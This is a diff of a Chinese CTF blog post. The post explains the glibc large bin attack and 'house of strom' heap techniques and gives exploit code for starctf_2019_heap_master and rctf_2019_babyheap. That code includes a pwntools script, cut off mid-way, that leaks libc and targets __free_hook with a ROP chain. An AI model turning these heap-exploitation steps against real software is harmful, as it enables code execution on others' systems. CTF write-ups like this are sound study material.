@@ -5,47 +5,47 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="large bin attack是一种堆利用手法，而house of strom则是在large bin attack的基础上借用unsorted bin来达到任意地址分配，首先我们从源码入手来分析large bin attack原理，然后再讲讲house of strom的原理，接着再看几个题目。 为例方便分析，以2.23为例，新版本有tcache的情况类似，只需填满tcache bin绕过tc">
 <meta property="og:type" content="article">
 <meta property="og:title" content="large bin attack &amp; house of strom">
-<meta property="og:url" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/index.html">
+<meta property="og:url" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="large bin attack是一种堆利用手法，而house of strom则是在large bin attack的基础上借用unsorted bin来达到任意地址分配，首先我们从源码入手来分析large bin attack原理，然后再讲讲house of strom的原理，接着再看几个题目。 为例方便分析，以2.23为例，新版本有tcache的情况类似，只需填满tcache bin绕过tc">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image3.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image4.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image5.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image6.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image7.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image8.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image9.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image10.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image11.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image12.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image13.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image14.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image15.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image16.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image17.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image18.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image19.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image1.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image2.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image3.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image4.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image5.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image6.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image7.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image8.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image9.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image10.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image11.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image12.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image13.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image14.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image15.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image16.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image17.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image18.png">
+<meta property="og:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image19.png">
 <meta property="article:published_time" content="2020-06-11T15:34:50.000Z">
 <meta property="article:modified_time" content="2025-06-25T13:34:18.973Z">
 <meta property="article:author" content="ha1vk">
@@ -54,9 +54,9 @@
 <meta property="article:tag" content="large bin attack">
 <meta property="article:tag" content="house of strom">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image1.png">
+<meta name="twitter:image" content="https://github.com/2020/06/11/large_bin_attack_house_of_strom/image1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/">
+<link rel="canonical" href="https://github.com/2020/06/11/large_bin_attack_house_of_strom/">
 
 
 <script id="page-configurations">
@@ -118,7 +118,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -139,27 +139,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -217,10 +217,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/06/11/large_bin_attack_house_of_strom/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/06/11/large_bin_attack_house_of_strom/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -255,7 +255,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -284,33 +284,33 @@
 
 <p>首先，victim就是unsorted bin chunk，也就在unsorted bin里未归位的large bin chunk。而fwd就是large bin的chunk。从上来看，首先，在unsorted bin里我们得有一个large bin chunk，并且在large bin里，我们也要有一个chunk，但是，我们得**[保证unsorted bin里的那个large bin chunk的size要比large bin里已有的这个chunk的size要大一点，但是都属于同一个index。]{.mark}**</p>
 <p>这样做的目的是我们想绕过前面的这一大块，直接到后面的那个else处。</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image1.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image1.png" class="">
 
 <p>然后，假设我们通过UAF或其他漏洞，控制了large bin里的这个chunk的bk_nextsize为addr1，那么**[victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim; &#x2F;&#x2F;第一次任意地址写入unsorted bin chunk的地址]{.mark}** 也就是addr1-&gt;fd_nextsize &#x3D; victim，也就是*(addr1+0x20) &#x3D; victim，这就是第一次任意地址写一个堆地址；接下来，假如，我们还能控制large bin里那个chunk的bk为addr2，那么首先**[bck &#x3D; fwd-&gt;bk;]{.mark}** 使得bck &#x3D; addr2，接下来**[bck-&gt;fd &#x3D; victim; &#x2F;&#x2F;第二次任意地址写入unsorted bin chunk的地址]{.mark}  *<em>也就是addr2-&gt;fd &#x3D; victim，也就是</em>(addr2+0x10) &#x3D; victim。这样利用large bin attack，我们可以有两次往任意地址写入堆地址的机会。下面，我们就来看一道题。</p>
 <h1 id="starctf-2019-heap-master"><a href="#starctf-2019-heap-master" class="headerlink" title="starctf_2019_heap_master"></a>starctf_2019_heap_master</h1><p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image2.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image2.png" class="">
 
 <p>然后，我们用IDA分析一下</p>
 <p>初始化</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image3.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image3.png" class="">
 
 <p>add函数</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image4.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image4.png" class="">
 
 <p>delete函数</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image5.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image5.png" class="">
 
 <p>edit函数</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image6.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image6.png" class="">
 
 <p>可以看到，这里面的edit，delete操作，都只是针对mmap出来的那片空间，而malloc出来的空间我们控制不了，无法写数据过去。也没有函数用于泄露。由此，我们可以使用large bin attack攻击IO_2_1_stdout结构体，第一次，将IO_2_1_stdout结构体的flags覆盖为堆地址，第二次利用错位将IO_2_1_stdout的_IO_write_base成员低1字节覆盖为0，这样就能泄露数据了。还有一点需要注意的是这个flags有要求</p>
 <p>首先，我们需要绕过这两个if，这就要求低1字节的低4位不能为8，第二字节的低4位必须要为8，也就是，我们的unsorted bin chunk地址末尾地址应该为0x800这样</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image7.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image7.png" class="">
 
 <p>接下来，到达new_do_write，我们要让这个if成立</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image8.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image8.png" class="">
 
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image9.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image9.png" class="">
 
 <p>综上，我们的unsorted bin chunk的地址某位应该是这样的0x1800、0x3800、0x5800…这样的第二字节高4位为奇数即可，由于堆地址随机化，因此第二字节高4位我们不用管，随着堆的随机化总有一次符合要求。我们只需要满足低12bit即可，也就是，**[这个未归位的unsorted bin chunk，我们需要放到偏移0x800处。并且在最后，我们还需要再链入一个小的unsorted bin，]{.mark}**不然我们执行了large bin attack后，在unsorted bin里还没找到符合申请大小的chunk，就会把large bin切割，导致崩溃。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	<span class="comment">#伪造8个chunk  </span></span><br><span class="line"><span class="number">2.</span>	<span class="comment">#0  </span></span><br><span class="line"><span class="number">3.</span>	edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0xF0</span>)  </span><br><span class="line"><span class="number">4.</span>	<span class="comment">#1  </span></span><br><span class="line"><span class="number">5.</span>	edit(<span class="number">0x420</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="number">6.</span>	<span class="comment">#2  </span></span><br><span class="line"><span class="number">7.</span>	edit(<span class="number">0x440</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="number">8.</span>	<span class="comment">#3  </span></span><br><span class="line"><span class="number">9.</span>	edit(<span class="number">0x880</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>) + <span class="string">&#x27;c&#x27;</span>*<span class="number">0xF0</span>)  </span><br><span class="line"><span class="number">10.</span>	<span class="comment">#4  </span></span><br><span class="line"><span class="number">11.</span>	edit(<span class="number">0xCB0</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="number">12.</span>	<span class="comment">#5  </span></span><br><span class="line"><span class="number">13.</span>	edit(<span class="number">0xCD0</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">&#x27;e&#x27;</span>*<span class="number">0x80</span>)  </span><br><span class="line"><span class="number">14.</span>	<span class="comment">#6  </span></span><br><span class="line"><span class="number">15.</span>	edit(<span class="number">0xD60</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;f&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="number">16.</span>	<span class="comment">#7  </span></span><br><span class="line"><span class="number">17.</span>	edit(<span class="number">0xD80</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;g&#x27;</span>*<span class="number">0x10</span>)  </span><br></pre></td></tr></table></figure>
@@ -320,42 +320,42 @@
 
 <h1 id="house-of-strom"><a href="#house-of-strom" class="headerlink" title="house of strom"></a>house of strom</h1><p>理解了large bin attack，接下来，我们就可以来看house of strom了，house of strom可以实现任意地址分配，看看前面的这道题，我们是将一个合法的unsorted bin chunk链接到unsorted bin里未归位的large bin chunk的bk处，<strong>[假设，我们将一个任意地址比如addr链接到unsorted bin里未归位的large bin chunk的bk处，然后执行large bin attack会发生什么。]{.mark}</strong></p>
 <p>那么，在large bin attack阶段不会有问题，只是接下来，继续遍历，取到我们链接上的这个chunk时，检查其size，不符合要求然后崩溃。我们可以利用前面的large bin attack，<strong>[先将addr处的size的位置写上一个堆指针，我们可以利用错位法，这样，在size处留下了chunk地址值的第6字节数据，在开启PIE的情况下，一般为0x55为0x56]{.mark}</strong>，这样，我们malloc(0x40)，遍历到第一个未归位的large bin chunk时，发生large bin attack，接下来遍历到后面这个任意地址的chunk时，发现size符合要求，直接返回给用户，就可以成功把这个任意地址的空间申请过来。</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image10.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image10.png" class="">
 
 <p>这就是house of strom的原理。</p>
 <p>我们来看两道题</p>
 <h1 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf_2019_babyheap"></a>rctf_2019_babyheap</h1><p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image11.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image11.png" class="">
 
 <p>沙箱禁用了execve调用，因此我们只能使用open、read、write来读flag</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image12.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image12.png" class="">
 
 <p>然后，我们用IDA分析一下，禁用fastbin，因此不能使用fastbin attack。</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image13.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image13.png" class="">
 
 <p>Edit功能存在null off by one漏洞。</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image14.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image14.png" class="">
 
 <p>Add功能里size比较自由</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image15.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image15.png" class="">
 
 <p>首先就是利用null off by one构造overlap chunk，然后利用malloc_consolidate将一个chunk放到large bin，另一个放到unsorted bin，然后利用overlap chunk去控制这两个bin的指针。然后malloc(0x48)触发large bin attack的同时将会把任意地址申请过来。</p>
 <p>我们用house of strom申请到free_hook处，劫持free_hook为setcontext+xx处，这样就能将栈切换到堆里，我们提前在堆里布置好rop即可。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./rctf_2019_babyheap&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28529</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">malloc_hook_s = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook_s = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext_s = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">open_s = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_s = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_s = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x3F0</span>) <span class="comment">#2 large bin chunk</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xF0</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x3F0</span>) <span class="comment">#6 large bin chunk</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#null off by one</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0x40</span> + <span class="number">0x100</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xF0</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recv(<span class="number">1</span>)</span><br><span class="line">main_arena_88 = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook_addr = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (malloc_hook_s &amp; <span class="number">0xFFF</span>)</span><br><span class="line">libc_base = malloc_hook_addr - malloc_hook_s</span><br><span class="line">free_hook_addr = libc_base + free_hook_s</span><br><span class="line">setcontext_addr = libc_base + setcontext_s</span><br><span class="line">write_addr = libc_base + write_s</span><br><span class="line">open_addr = libc_base + open_s</span><br><span class="line">read_addr = libc_base + read_s</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000021102</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x00000000000202e8</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;free_hook_addr=&#x27;</span>,<span class="built_in">hex</span>(free_hook_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;setcontext_addr=&#x27;</span>,<span class="built_in">hex</span>(setcontext_addr)</span><br><span class="line"><span class="comment">#将剩余部分申请，现在2与1重合</span></span><br><span class="line">add(<span class="number">0x430</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#继续用同样的方法，构造一个未归位的large bin，并且比前一个大一些,但是要保证处于同一个index内</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0x50</span> + <span class="number">0x100</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0xF0</span>) <span class="comment">#4</span></span><br><span class="line"><span class="comment">#将剩余部分申请，5与6重合</span></span><br><span class="line">add(<span class="number">0x440</span>) <span class="comment">#6</span></span><br><span class="line"><span class="comment">#2放入unsorted bin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#2放入large bin</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#6放入unsorted bin</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#现在，堆布局是unsorted bin里一个未归位的large bin,large bin里有一个chunk，且unsorted bin里的比large 